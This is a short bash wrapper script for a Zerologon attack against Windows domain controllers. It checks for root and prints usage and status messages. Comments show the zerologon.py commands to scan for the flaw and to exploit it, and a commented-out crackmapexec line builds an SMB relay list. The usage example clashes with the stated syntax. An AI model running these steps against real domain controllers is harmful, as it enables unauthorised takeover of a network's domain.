#!/bin/bash
# Credits to: https://github.com/rth0pper/zerologon

if [ "$EUID" -ne 0 ]
  then echo "Please run as root"
  exit
fi

# python3 zerologon.py NETBIOS_NAME X.X.X.X
# Scans the target for the vulnerability
# python3 zerologon.py NETBIOS_NAME X.X.X.X -exploit

echo " "
echo "Syntax: zerologon.sh 'DC netbios name' 'DC IP'" 
echo "Example: ./zerologon.sh 192.168.123.1/24 10.10.10.20"
echo "Analyzing..."
echo " "
echo "Enumerating smb hosts"
# crackmapexec smb — gen-relay-list smb_targets_"$subnetStr".txt "$1"
echo " "
echo "Finding vulnerable hosts with nmap"